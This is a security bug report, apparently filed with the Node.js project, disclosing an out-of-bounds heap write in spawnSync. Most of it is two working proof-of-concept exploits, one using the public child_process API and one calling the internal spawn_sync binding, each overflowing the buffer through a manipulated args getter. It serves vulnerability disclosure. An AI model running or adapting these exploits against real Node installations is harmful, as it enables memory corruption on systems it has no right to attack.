spawnSync can be used to perform OOB memory write



Version: 6.4-8
Platform:
Subsystem:

Apologies for the multiple issues, this is the last of the bunch and maybe most serious:
spawnSync can be used to perform an OOB memory write. Specifically,
the buffer allocated on line 979 of spawn_sync.cc:
  buffer = new char[list_size + data_size];

is overwritten with StringBytes::Write on line 986, by passing a JS
arugment that is larger than the allocated buffer.
Here is an exploit using the high-level node API:
const spawn = require('child_process').spawnSync;
let counter = 0;
// mess with args
const args = [ 'ls', '-a' ];

Object.defineProperty(args, 2, {
  get: () => { 
    if (counter++ === 2) { // set this to 3 for v6.4, 2 for 8
      // compute giant string to overlow
      let str = 'pwn0';
      for (let i =0 ;i <100024; i++) {
        str+='pwnpwn'
      }
      return str;
    } else {
      return 'pwn0';
    }
  },
  enumerable: true
});

args.slice = () => { // so normalizing args does nothing
  return args;
};
args.unshift = (file) => {
  // need this so the unshift in child_process doesn't throw
};

spawn('ls', args);
You need to mess with args to get the JS code that calls the binding
layer to do what you want, but you can also just call the binding
function directly:
let counter = 0;
const spawn_sync = process.binding('spawn_sync');

// compute envPairs as done by child_process
let envPairs = [];
for (var key in process.env) {
  envPairs.push(key + '=' + process.env[key]);
}

// mess with args
const args = [ '-a' ];

Object.defineProperty(args, 1, {
  get: () => { 
    if (counter++ === 2) {
      // compute giant string to overlow
      let str = 'pwn0';
      for (let i =0 ;i <100024; i++) {
        str+='pwnpwn'
      }
      return str;
    } else {
      return 'pwn0';
    }
  },
  enumerable: true
});


const options = {
  file: 'ls',
  args: args,
  envPairs: envPairs,
  stdio: [
    { type: 'pipe', readable: true, writable: false },
    { type: 'pipe', readable: false, writable: true },
    { type: 'pipe', readable: false, writable: true } 
  ]

};
spawn_sync.spawn(options);

@mlfbrown for working with me on this

